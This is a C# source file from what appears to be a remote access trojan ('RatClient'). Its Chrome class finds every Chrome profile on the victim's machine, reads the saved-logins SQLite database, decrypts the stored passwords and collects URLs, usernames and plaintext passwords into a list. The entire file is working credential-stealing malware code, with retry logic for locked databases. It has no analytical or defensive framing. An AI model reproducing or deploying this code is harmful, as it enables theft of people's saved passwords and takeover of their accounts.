using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;

namespace RatClient.Features.Password.Chrome
{
    class Chrome
    {
        #region Variables
        public string BrowserName { get { return "Chrome"; } }
        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        private bool doLogging = false;
        #endregion

        #region Methods
        public List<CredentialModel> ReadPasswords()
        {
            var result = new List<CredentialModel>();
            var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var baseLoginPath = Path.Combine(localAppDataPath, "Google\\Chrome\\User Data");
            var profileDirectories = Directory.GetDirectories(baseLoginPath, "Profile *");

            foreach (var profileDir in profileDirectories)
            {
                var loginPath = Path.Combine(profileDir, "Login Data");

                if (File.Exists(loginPath))
                {
                    bool retry = true;
                    while (retry)
                    {
                        try
                        {
                            if (doLogging) Console.WriteLine($"Found chrome login file: {loginPath}");
                            using (var conn = new SQLiteConnection($"Data Source={loginPath};"))
                            {
                                conn.Open();
                                using (var cmd = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", conn))
                                {
                                    using (var reader = cmd.ExecuteReader())
                                    {
                                        if (reader.HasRows)
                                        {
                                            var key = GCDecryptor.GetKey();
                                            while (reader.Read())
                                            {
                                                byte[] nonce, ciphertextTag;
                                                var encryptedData = GetBytes(reader, 2);
                                                GCDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                                var password = string.Empty;
                                                try
                                                {
                                                    password = GCDecryptor.Decrypt(ciphertextTag, key, nonce);
                                                }
                                                catch (Exception ex)
                                                {
                                                    if (doLogging) Console.WriteLine($"An error occurred during decryption: {ex.Message}, skipping this entry.");
                                                    continue;
                                                }

                                                var url = reader.GetString(0);
                                                var username = reader.GetString(1);

                                                if (!string.IsNullOrEmpty(url) && url.StartsWith("http") && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                                                {
                                                    result.Add(new CredentialModel()
                                                    {
                                                        Url = url,
                                                        Username = username,
                                                        Password = password
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            retry = false;
                        }
                        catch (SQLiteException ex)
                        {
                            if (ex.Message.Contains("database is locked"))
                            {
                                if (doLogging) Console.WriteLine("Database is locked, retrying...");
                                System.Threading.Thread.Sleep(1000);
                            }
                            else
                            {
                                if (doLogging) Console.WriteLine($"An error occurred while accessing the database: {ex.Message}");
                                retry = false;
                            }
                        }
                    }
                }
            }

            if (result.Count == 0)
            {
                throw new FileNotFoundException("Cannot find chrome logins file in any profile");
            }

            return result;
        }
        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
        #endregion
    }
}